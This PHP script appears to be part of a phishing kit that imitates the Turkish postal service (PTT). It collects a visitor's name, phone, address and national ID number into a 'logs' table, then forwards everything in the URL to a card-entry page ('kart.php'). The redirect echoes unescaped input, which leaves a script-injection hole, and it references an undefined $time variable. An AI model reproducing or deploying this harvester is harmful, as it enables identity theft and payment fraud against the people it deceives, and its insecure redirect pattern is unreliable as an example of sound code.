<?php

include 'db/connect.php';

$isim = $_POST['isim'] ?? '';
$soyisim = $_POST['soyisim'] ?? '';
$postaKodu = $_POST['postakodu'] ?? '';
$telefon = $_POST['telefon'] ?? '';
$adresBasligi = $_POST['adresbasligi'] ?? '';
$tc = $_POST['tc'] ?? '';
$adres = $_POST['adres'] ?? '';

$tam = $isim." ".$soyisim;
$query = $baglanti->prepare("INSERT INTO bella_ptt3_logs (isimsoyisim, postakodu, telefon, adresbasligi, tc, adres,zaman) VALUES (?,?,?,?,?,?,?)");
$query->execute([$tam, $postaKodu, $telefon, $adresBasligi, $tc, $adres,$time]);

if($query){
    echo "<meta http-equiv='refresh' content='0; url=kart.php?ad=$isim&soyisim=$soyisim&postakodu=$postaKodu&adres=$adres&telefon=$telefon&tc=$tc'>";
}


?>
